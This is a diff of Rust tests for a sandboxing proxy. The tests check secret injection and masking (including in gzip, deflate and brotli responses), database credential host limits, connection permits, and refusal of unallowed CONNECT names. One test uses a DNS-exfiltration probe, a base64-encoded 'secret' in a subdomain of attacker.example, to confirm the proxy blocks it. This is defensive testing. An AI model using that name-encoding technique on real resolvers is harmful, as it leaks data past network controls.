@@ -25,7 +25,9 @@ fn session(t: &TestCore) -> Arc<Session> {
 }
 
 /// A service handler, registered only so `target()` resolves and the tunnel /
-/// MITM runs; these tests never reach the upstream.
+/// MITM runs; these tests never reach the upstream. Registered without TLS:
+/// HTTPS to it is then refused after a request is decided and its secrets
+/// added, where a handler whose TLS the daemon terminates would be sent it.
 struct NeverServed;
 impl crate::ServiceHandler for NeverServed {
     fn serve(&self, _s: Arc<Session>, _io: Box<dyn crate::ServiceIo>) {}
@@ -104,8 +106,8 @@ async fn an_unresolvable_secret_refuses_the_request() {
     );
     let s = session(&t);
     // A service so target() resolves and the MITM runs; inject fails before
-    // open_tls, so the upstream is never reached.
-    service(&t, "api.example", true);
+    // open_upstream, so the upstream is never reached.
+    service(&t, "api.example", false);
     let io = dial(&t, &s, "api.example", 443);
     let name = rustls::pki_types::ServerName::try_from("api.example").unwrap();
     let tls = guest_tls(&s).connect(name, io).await.unwrap();
@@ -192,8 +194,8 @@ async fn send_with_placeholder(t: &TestCore, s: &Arc<Session>, name: &str) -> St
 
 /// A secret minted by a host command is run on first use and reused for the
 /// requests after it, until it needs refreshing: the command is not run per
-/// request. (The upstream is a service, so the request ends in a 502 after the
-/// secret was resolved and injected.)
+/// request. (The upstream is a service whose TLS isn't the daemon's, so the
+/// request ends in a 502 after the secret was resolved and injected.)
 #[tokio::test]
 async fn a_command_secret_is_minted_once_and_injected() {
     let runs = std::env::temp_dir().join(format!("zapper-mint-runs-{}", std::process::id()));
@@ -206,7 +208,7 @@ async fn a_command_secret_is_minted_once_and_injected() {
         "secrets:\n  tok: {{ command: [sh, -c, {script:?}], hosts: [api.example] }}\nprofiles:\n  web:\n    policy:\n      net:\n        - {{ action: allow, host: api.example, methods: [GET], secrets: [tok] }}\n"
     ));
     let s = session(&t);
-    service(&t, "api.example", true);
+    service(&t, "api.example", false);
     for i in 0..3 {
         assert_eq!(
             send_with_placeholder(&t, &s, "tok").await,
@@ -241,7 +243,7 @@ async fn a_failing_command_secret_refuses_the_request() {
         "secrets:\n  tok: { command: [sh, -c, \"echo LEAKED_STDOUT; echo 'HTTP 401: Bad credentials' >&2; exit 1\"], hosts: [api.example] }\nprofiles:\n  web:\n    policy:\n      net:\n        - { action: allow, host: api.example, methods: [GET], secrets: [tok] }\n",
     );
     let s = session(&t);
-    service(&t, "api.example", true);
+    service(&t, "api.example", false);
     assert_eq!(
         send_with_placeholder(&t, &s, "tok").await,
         StatusCode::FORBIDDEN
@@ -278,7 +280,7 @@ fn gh_secret(script: &str) -> zapper_policy::Secret {
 async fn a_session_secret_is_injected_for_its_own_session_only() {
     let t = TestCore::new("profiles:\n  web:\n    policy:\n      net: []\n");
     let (a, b) = (session(&t), session(&t));
-    service(&t, "api.example", true);
+    service(&t, "api.example", false);
     let rule = || {
         zapper_policy::AnyRule::Net(zapper_policy::NetRule {
             id: Some("gh".into()),
@@ -363,6 +365,37 @@ async fn a_session_secret_cannot_take_a_config_secrets_name_or_be_a_guest_secret
 /// override headers it saw, and every request header, in its body and in an
 /// `x-seen-authorization` response header: what an echo API leaks.
 struct HttpEcho;
+
+/// `body` in the coding a path names (`/gzip`, `/deflate`, `/br`, `/zstd`),
+/// else as it is.
+fn compressed(path: &str, body: Vec<u8>) -> (&'static str, Vec<u8>) {
+    use std::io::Write;
+    let coding = ["gzip", "deflate", "br", "zstd"]
+        .into_iter()
+        .find(|c| path.starts_with(&format!("/{c}")));
+    match coding {
+        Some("gzip") => {
+            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+            e.write_all(&body).unwrap();
+            ("gzip", e.finish().unwrap())
+        }
+        Some("deflate") => {
+            let mut e = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
+            e.write_all(&body).unwrap();
+            ("deflate", e.finish().unwrap())
+        }
+        Some("br") => {
+            let mut out = Vec::new();
+            {
+                let mut e = brotli::CompressorWriter::new(&mut out, 4096, 5, 22);
+                e.write_all(&body).unwrap();
+            }
+            ("br", out)
+        }
+        Some(_) => ("zstd", body),
+        None => ("identity", body),
+    }
+}
 impl crate::ServiceHandler for HttpEcho {
     fn serve(&self, _s: Arc<Session>, io: Box<dyn crate::ServiceIo>) {
         tokio::spawn(async move {
@@ -380,9 +413,13 @@ impl crate::ServiceHandler for HttpEcho {
                         .get("authorization")
                         .cloned()
                         .unwrap_or(hyper::header::HeaderValue::from_static(""));
+                    // An upstream that compresses whatever it was asked for
+                    // (`/zstd` only says so: a coding the proxy can't decode).
+                    let (encoding, body) = compressed(req.uri().path(), body.into_bytes());
                     Ok::<_, std::convert::Infallible>(
                         hyper::Response::builder()
                             .header("x-seen-authorization", auth)
+                            .header("content-encoding", encoding)
                             .body(http_body_util::Full::new(Bytes::from(body)))
                             .unwrap(),
                     )
@@ -538,6 +575,107 @@ async fn an_injected_secret_is_masked_in_the_response() {
     assert_eq!(seen.len(), "Bearer the-secret-value-123".len());
 }
 
+/// A response compressed though the proxy asked for it uncompressed, to a
+/// request it added a secret to, is decoded, masked and sent on
+/// uncompressed; one in a coding it can't decode is refused. Without a
+/// secret added, it goes through as it came.
+#[tokio::test]
+async fn a_compressed_response_to_a_request_with_a_secret_is_decoded_and_masked() {
+    let (t, s) = echo_core("        - { action: allow, host: api.example, ports: [80], methods: [GET], secrets: [s] }\n");
+    let auth = format!("Bearer {}", zapper_policy::placeholder("s"));
+    for coding in ["gzip", "deflate", "br"] {
+        let path = format!("/{coding}");
+        let (status, headers, body) = request(
+            &t,
+            &s,
+            Method::GET,
+            &path,
+            &[("authorization", auth.clone())],
+        )
+        .await;
+        assert_eq!(status, StatusCode::OK, "{coding}: {body}");
+        assert!(
+            !headers.contains_key("content-encoding"),
+            "{coding}: {headers:?}"
+        );
+        assert!(
+            body.contains(&format!("path={path}")),
+            "{coding}: decoded: {body}"
+        );
+        assert!(!body.contains("the-secret-value-123"), "{coding}: {body}");
+        assert!(
+            body.contains("authorization: Bearer ********************"),
+            "{coding}: {body}"
+        );
+    }
+    let (status, _, body) = request(&t, &s, Method::GET, "/zstd", &[("authorization", auth)]).await;
+    assert_eq!(status, StatusCode::BAD_GATEWAY, "{body}");
+    assert!(!body.contains("the-secret-value-123"), "{body}");
+    assert!(body.contains("zstd-encoded"), "{body}");
+
+    let (status, headers, _) = request(&t, &s, Method::GET, "/gzip", &[]).await;
+    assert_eq!(status, StatusCode::OK, "no secret added, nothing to mask");
+    assert_eq!(headers["content-encoding"], "gzip", "passed on as it came");
+}
+
+/// A body that decodes to far more than it is comes out in pieces, each
+/// bounded, and whole.
+#[tokio::test]
+async fn a_decoded_body_comes_out_in_bounded_pieces() {
+    use http_body_util::BodyExt;
+    use std::io::Write;
+    let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::best());
+    e.write_all(&vec![b'a'; 8 << 20]).unwrap();
+    let gz = e.finish().unwrap();
+    assert!(gz.len() < 64 << 10, "{}", gz.len());
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    tokio::spawn(async move {
+        let (io, _) = listener.accept().await.unwrap();
+        let svc = hyper::service::service_fn(move |_req: Request<hyper::body::Incoming>| {
+            let gz = gz.clone();
+            async move {
+                Ok::<_, std::convert::Infallible>(
+                    hyper::Response::builder()
+                        .header("content-encoding", "gzip")
+                        .body(http_body_util::Full::new(Bytes::from(gz)))
+                        .unwrap(),
+                )
+            }
+        });
+        let _ = hyper::server::conn::http1::Builder::new()
+            .serve_connection(TokioIo::new(io), svc)
+            .await;
+    });
+    let io = tokio::net::TcpStream::connect(addr).await.unwrap();
+    let (mut sender, conn) = hyper::client::conn::http1::handshake(TokioIo::new(io))
+        .await
+        .unwrap();
+    tokio::spawn(conn);
+    let resp = sender
+        .send_request(
+            Request::builder()
+                .uri("/")
+                .body(Empty::<Bytes>::new())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    let mut body = super::sanitize::decode_response(resp, "gzip")
+        .unwrap()
+        .into_body();
+    let (mut total, mut largest) = (0usize, 0usize);
+    while let Some(frame) = body.frame().await {
+        if let Ok(data) = frame.unwrap().into_data() {
+            assert!(data.iter().all(|b| *b == b'a'));
+            total += data.len();
+            largest = largest.max(data.len());
+        }
+    }
+    assert_eq!(total, 8 << 20, "whole");
+    assert!(largest <= 2 << 20, "a piece of {largest} bytes");
+}
+
 /// A plain-HTTP echo at `api.example:80` and an `aws` secret, `aws`, whose
 /// keys (with a session token) are the documentation's examples.
 fn aws_core(rules: &str) -> (TestCore, Arc<Session>) {
@@ -665,4 +803,134 @@ async fn the_fake_aws_key_signs_only_for_the_secrets_hosts() {
             .contains("may not sign for sibling.example"),
         "{ev}"
     );
+}
+
+/// A database rule wider than its `dbauth` secret's hosts doesn't widen where
+/// the credential goes: to a host the rule allows but the secret isn't for,
+/// it is refused before the secret is even read; to one of its hosts, it
+/// gets past that (and here fails only to connect).
+#[tokio::test]
+async fn a_dbauth_secret_goes_only_to_its_hosts() {
+    let t = TestCore::with_daemon(
+        "private_networks: [10.0.0.0/8]",
+        "secrets:\n  prod: { value: pw, mode: dbauth, hosts: [10.0.0.9], user: app }\nprofiles:\n  web:\n    policy:\n      net:\n        - { action: allow, host: \"10.*\", ports: [6379], protocol: redis, secrets: [prod] }\n",
+    );
+    let s = session(&t);
+    let mut io = crate::testing::dial_addr(&t, &s, "10.1.2.3".parse().unwrap(), 6379);
+    let _ = io.write_all(b"*1\r\n$4\r\nPING\r\n").await;
+    let refused = net_event(&t, &s, 0).await["error"].to_string();
+    assert!(
+        refused.contains("secret prod isn't for 10.1.2.3"),
+        "{refused}"
+    );
+
+    // Within the secret's hosts: not refused for that. The relay goes on to
+    // dial 10.0.0.9, which here may fail at once or hang, so what follows
+    // isn't waited for: a refusal would be logged before any dial.
+    let mut io = crate::testing::dial_addr(&t, &s, "10.0.0.9".parse().unwrap(), 6379);
+    let _ = io.write_all(b"*1\r\n$4\r\nPING\r\n").await;
+    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+    let events = crate::testing::net_events(&t, &s);
+    assert!(
+        events[1..]
+            .iter()
+            .all(|e| !e["error"].to_string().contains("isn't for")),
+        "{events:?}"
+    );
+}
+
+/// A CONNECT to a name no rule could allow is refused before the name is
+/// looked up on the host, even when a rule with a path makes every
+/// connection inspected (so decided per request): else any name the guest
+/// made up, data encoded in it, would reach the host's resolver, which the
+/// DNS resolver refuses. A name a rule allows gets past it.
+#[tokio::test]
+async fn an_inspected_connect_to_a_name_nothing_allows_is_not_looked_up() {
+    let t = TestCore::new(
+        "profiles:\n  web:\n    policy:\n      net:\n        - { action: allow, host: ok.example }\n        - { action: deny, host: \"*\", path: \"/admin/**\" }\n      defaults: { net: deny }\n",
+    );
+    let s = session(&t);
+    let connect = |host: &'static str| {
+        let (d, s) = (t.core.daemon().clone(), s.clone());
+        async move {
+            let (mut guest, host_side) = tokio::net::UnixStream::pair().unwrap();
+            tokio::spawn(super::serve(d, s, host_side));
+            guest
+                .write_all(
+                    format!("CONNECT {host}:443 HTTP/1.1\r\nHost: {host}:443\r\n\r\n").as_bytes(),
+                )
+                .await
+                .unwrap();
+            let mut reply = vec![0u8; 512];
+            let n = tokio::io::AsyncReadExt::read(&mut guest, &mut reply)
+                .await
+                .unwrap();
+            String::from_utf8_lossy(&reply[..n]).into_owned()
+        }
+    };
+    let refused = connect("c2VjcmV0.attacker.example").await;
+    assert!(refused.starts_with("HTTP/1.1 403"), "{refused}");
+    assert!(refused.contains("no rule allows this name"), "{refused}");
+    // Allowed: past the check, to the host's resolver (which this test
+    // doesn't have).
+    let allowed = connect("ok.example").await;
+    assert!(!allowed.contains("no rule allows"), "{allowed}");
+}
+
+/// A CONNECT tunnel holds a connection permit of its own for as long as it
+/// runs: with none left, it is refused, not opened past the cap.
+#[tokio::test]
+async fn a_tunnel_needs_a_connection_permit() {
+    let (t, s) = echo_core("        - { action: allow, host: api.example, ports: [80] }\n");
+    let connect = || {
+        let (d, s) = (t.core.daemon().clone(), s.clone());
+        async move {
+            let (mut guest, host_side) = tokio::net::UnixStream::pair().unwrap();
+            tokio::spawn(super::serve(d, s, host_side));
+            guest
+                .write_all(b"CONNECT api.example:80 HTTP/1.1\r\nHost: api.example:80\r\n\r\n")
+                .await
+                .unwrap();
+            let mut reply = vec![0u8; 512];
+            let n = tokio::io::AsyncReadExt::read(&mut guest, &mut reply)
+                .await
+                .unwrap();
+            (guest, String::from_utf8_lossy(&reply[..n]).into_owned())
+        }
+    };
+    let conns = s.runtime.conns();
+    let all = conns.available_permits() as u32;
+    let held = conns.clone().try_acquire_many_owned(all).unwrap();
+    let (_, refused) = connect().await;
+    assert!(refused.starts_with("HTTP/1.1 503"), "{refused}");
+    drop(held);
+    let (_tunnel, opened) = connect().await;
+    assert!(opened.starts_with("HTTP/1.1 200"), "{opened}");
+    assert_eq!(conns.available_permits() as u32, all - 1, "the tunnel's");
+}
+
+/// A database rule relays only to a real address: a name the daemon
+/// serves itself is refused, its credential never sent to a service.
+#[tokio::test]
+async fn a_database_rule_doesnt_relay_to_a_service() {
+    let t = TestCore::new(
+        "secrets:\n  db: { value: pw, mode: dbauth, hosts: [db.internal], user: app }\nprofiles:\n  web:\n    policy:\n      net:\n        - { action: allow, host: db.internal, ports: [6379], protocol: redis, secrets: [db] }\n",
+    );
+    let s = session(&t);
+    t.core
+        .add_service(crate::ServiceSpec {
+            name: "db.internal".into(),
+            port: 6379,
+            sessions: Default::default(),
+            target: crate::ServiceTarget::Handler {
+                tls: false,
+                handler: Arc::new(HttpEcho),
+            },
+            owner: "test".into(),
+        })
+        .unwrap();
+    let mut io = dial(&t, &s, "db.internal", 6379);
+    let _ = io.write_all(b"*1\r\n$4\r\nPING\r\n").await;
+    let refused = net_event(&t, &s, 0).await["error"].to_string();
+    assert!(refused.contains("is a service"), "{refused}");
 }
